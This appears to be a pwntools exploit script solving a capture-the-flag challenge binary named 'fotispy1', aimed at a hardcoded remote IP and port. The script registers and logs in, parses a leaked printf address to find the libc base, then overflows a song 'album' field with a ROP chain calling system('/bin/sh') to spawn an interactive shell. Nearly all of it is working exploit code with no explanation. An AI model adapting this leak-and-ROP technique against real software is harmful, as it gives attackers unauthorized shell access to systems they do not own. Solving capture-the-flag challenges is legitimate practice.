from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./fotispy1.patch"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("52.59.124.14", 5191)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def register(name, pwd):
    io.sendlineafter("your choice [E]: ", "0")
    io.sendlineafter("username:", name)
    io.sendlineafter("password:", pwd)


def login(name, pwd):
    io.sendlineafter("your choice [E]: ", "1")
    io.sendlineafter("username:", name)
    io.sendlineafter("password:", pwd)


def addasong(title, who, album):
    io.sendlineafter("your choice [E]: ", "2")
    io.recvuntil("[DEBUG] ", drop=True)
    leak = int(io.recvline(), 16)
    log.success("printf:-----> " + hex(leak))
    libc.address = leak - libc.symbols["printf"]
    log.success("libc.address :-----> " + hex(libc.address))

    system_addr = libc.symbols.get("system")
    binsh_addr = next(libc.search("/bin/sh"))
    pop_rdi = next(libc.search(asm("pop rdi; ret")))
    ret = next(libc.search(asm("ret")))

    payload = b"tinyfat" + b"a" * 6
    payload += p64(libc.address + 8)
    payload += p64(0)
    payload += p64(0x4019ae)
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    album = payload

    io.sendlineafter("title:", title)
    io.sendlineafter("from:", who)
    io.sendlineafter("title is on:", album)


def display():
    io.sendlineafter("your choice [E]: ", "3")


register("tinyfat", "tinyfat")
login("tinyfat", "tinyfat")
ddebug("break *0x04017A6\n break *0x04018F1\n break *0x4019AD\n continue")

addasong("title", "from", "")
display()

io.interactive()
